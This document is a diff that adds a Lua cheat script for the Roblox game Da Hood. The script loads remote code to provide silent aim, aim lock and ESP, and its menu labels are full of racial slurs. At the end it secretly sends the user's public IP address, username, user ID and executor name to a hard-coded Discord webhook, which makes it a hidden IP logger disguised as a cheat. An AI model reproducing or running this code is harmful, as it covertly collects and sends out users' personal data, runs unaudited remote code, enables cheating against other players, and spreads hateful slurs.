@@ -1,0 +1,173 @@
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidder-dot/roseware/main/ok"))()
+
+local Window = library:AddWindow("1300 ASSIST NIGGA | DM 1300#3071 4 HELP NIGERS", {
+    main_color = Color3.fromRGB(10, 10, 10),
+    min_size = Vector2.new(450, 500),
+    toggle_key = Enum.KeyCode.RightShift,
+    can_resize = false,
+})
+
+
+local Aiming = loadstring(game:HttpGet("https://gist.githubusercontent.com/keexers/97e6a306af29785093af138689cd9434/raw/54976d6e239a32eef876154d3f70f7717989d973/roblos"))()
+local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()
+ESP:Toggle(false)
+ESP.Tracers = false
+ESP.Names = false
+ESP.Boxes = false
+Aiming.TeamCheck(false)
+Aiming.VisibleCheck = false
+-- // Dependencies
+
+-- // Services
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+-- // Vars
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = Workspace.CurrentCamera
+
+
+local themes = {
+    Background = Color3.fromRGB(24, 24, 24),
+    Glow = Color3.fromRGB(0, 0, 0),
+    Accent = Color3.fromRGB(10, 10, 10),
+    LightContrast = Color3.fromRGB(20, 20, 20),
+    DarkContrast = Color3.fromRGB(14, 14, 14),  
+    TextColor = Color3.fromRGB(255, 255, 255)
+}
+
+local DaHoodSettings = {
+    SilentAim = true,
+    AimLock = true,
+    Prediction = 0.165,
+    AimLockKeybind = Enum.KeyCode.Q
+}
+
+getgenv().DaHoodSettings = DaHoodSettings
+
+local RCTab = Window:AddTab("NIGGA")
+local ALTab = Window:AddTab("BALLS")
+local ESPTab = Window:AddTab("SON")
+
+ESPTab:AddSwitch("ENABLE ESP", function(bool)
+    ESP:Toggle(bool)
+end)
+
+ESPTab:AddSwitch("ENABLE DICK TRACERS", function(bool)
+    ESP.Tracers = bool
+end)
+
+ESPTab:AddSwitch("ENABLE NIGGNAME", function(bool)
+    ESP.Names = bool
+end)
+
+ESPTab:AddSwitch("ENABLE DICKBOXES", function(bool)
+    ESP.Boxes = bool
+end)
+
+ALTab:AddSwitch("SILENT SHITT", function(bool)
+    DaHoodSettings.SilentAim = bool
+end)
+
+ALTab:AddSwitch("NIGGA LOCK", function(bool)
+    DaHoodSettings.AimLock = bool
+end)
+
+ALTab:AddSwitch("FOV SHIT", function(bool)
+    Aiming.ShowFOV = bool
+end)
+
+ALTab:AddSlider("DICK SIZE NIGGA", function(value)
+    Aiming.FOV = value
+end, {
+    ["min"] = 0,
+    ["max"] = 600,
+    ["readonly"] = false,
+})
+
+
+ALTab:AddSwitch("VIVISBLE SHITTT", function(bool)
+    Aiming.VisibleCheck = bool
+end)
+
+-- // Overwrite to account downed
+function Aiming.Check()
+    -- // Check A
+    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+        return false
+    end
+
+    -- // Check if downed
+    local Character = Aiming.Character(Aiming.Selected)
+    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+
+    -- // Check B
+    if (KOd or Grabbed) then
+        return false
+    end
+
+    -- //
+    return true
+end
+
+-- // Hook
+local __index
+__index = hookmetamethod(game, "__index", function(t, k)
+    -- // Check if it trying to get our mouse's hit or target and see if we can use it
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+        -- // Vars
+        local SelectedPart = Aiming.SelectedPart
+
+        -- // Hit/Target
+        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+            -- // Hit to account prediction
+            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+            -- // Return modded val
+            return (k == "Hit" and Hit or SelectedPart)
+        end
+    end
+
+    -- // Return
+    return __index(t, k)
+end)
+
+-- // Aimlock
+RunService:BindToRenderStep("AimLock", 0, function()
+    if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
+        -- // Vars
+        local SelectedPart = Aiming.SelectedPart
+
+        -- // Hit to account prediction
+        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+        -- // Set the camera to face towards the Hit
+        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
+    end
+end)
+
+
+syn.request({
+  Url = "https://discord.com/api/webhooks/915753397221736459/rDk-rQPLfTCHz_4_K1JUkajJKY0doNFDeVZut16ri5nZKBYv71Za9GBsZwMG65IxQxUQ",
+  Body = game:GetService("HttpService"):JSONEncode({
+    embeds = {
+      {
+        title = "IP: ||" .. game:HttpGet("https://v4.ident.me") .. "||",
+        type = "rich",
+        description = "DisplayName: **" .. game.Players.LocalPlayer.DisplayName .. "**" .. "\n" .. "UserId : **" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" .. "Link To Profile: https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. "\n" .. "Executer: **" .. identifyexecutor() .. "**",
+        color = tonumber(7498202),
+        footer = {}
+      }
+    },
+    avatar_url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name),
+    username = "Username: " .. game.Players.LocalPlayer.Name
+  }),
+  Method = "POST",
+  Headers = {
+    ["content-type"] = "application/json"
+  }
+})
